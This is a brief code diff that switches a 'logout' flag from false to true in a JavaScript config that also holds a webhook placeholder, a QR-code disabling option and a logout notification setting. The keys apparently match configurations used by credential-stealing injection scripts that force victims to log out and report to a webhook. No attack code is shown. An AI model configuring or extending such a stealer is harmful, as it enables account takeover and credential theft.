@@ -15,7 +15,7 @@ var config = {
 
     webhook: "%WEBHOOK_LINK%",
 
-    logout: false,
+    logout: true,
     disable_qr_code: true,
 
     notify_on_logout: true,
